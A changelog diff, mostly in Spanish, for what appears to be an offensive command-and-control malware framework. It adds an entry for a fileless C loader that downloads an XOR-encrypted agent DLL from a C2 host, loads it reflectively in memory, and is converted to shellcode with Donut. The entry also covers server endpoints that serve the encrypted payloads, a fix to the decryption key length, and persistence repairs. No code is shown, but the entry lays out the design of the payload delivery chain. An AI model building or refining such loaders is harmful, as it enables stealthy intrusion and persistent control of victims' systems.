@@ -7,6 +7,23 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Added — Fileless Multi-Stage Pipeline (stage0-lite)
+- **Stage0-lite**: reemplaza el Stage 3 Rust por un loader C (~16 KB EXE / ~64 KB shellcode)
+  - `stages/stage0-lite/src/stage0_lite.c` — entry point, descarga agent DLL vía WinHTTP
+  - `stages/stage0-lite/src/winhttp_dl.c` — HTTP/HTTPS download con XOR decrypt en memoria
+  - `stages/stage0-lite/src/pe_loader.c` — reflective PE loader: mapeo de secciones, relocaciones, IAT, `CreateThread` para DllMain
+  - `stages/stage0-lite/src/config.h` — configuración en tiempo de compilación (`C2_HOST`, `C2_PORT`, `API_PORT`, `STAGE1_XOR_KEY_LEN`)
+  - Cross-compilado con `mingw-w64`; wrapeado con Donut para shellcode PIC
+  - Validado end-to-end: ESTER → JAVELIN → stage0-lite → agent.dll en memoria → beacon TLS ✅
+- **Server API endpoints** (`c2r2-server/src/api/`):
+  - `GET /api/stage1/agent_dll` — sirve `dist/agent.dll` XOR-encriptado con prefijo de 4 bytes LE
+  - `GET /api/stage1/lite` — sirve `dist/stage0_lite.bin.enc`
+- **JAVELIN loader.rs** reemplazado: de 68K líneas a 63 líneas con `include_bytes!` del shellcode
+- **builder/src/stage_builder.rs** actualizado para ensamblar la nueva cadena
+- **Bug crítico resuelto**: `STAGE1_XOR_KEY_LEN` corregido de 32 → 31 (coincide con `.len()` del servidor Rust)
+  - Síntoma: `e_lfanew = 0x320611E5` (garbage) → crash en reflective loader
+  - Causa: el byte null del string literal de C era incluido en el ciclo XOR
+
 ### Fixed
 - **Critical: Persistence mechanism failures after reboot** ([#persistence-fix])
   - Fixed issue where persistence entries pointed to non-existent executable paths
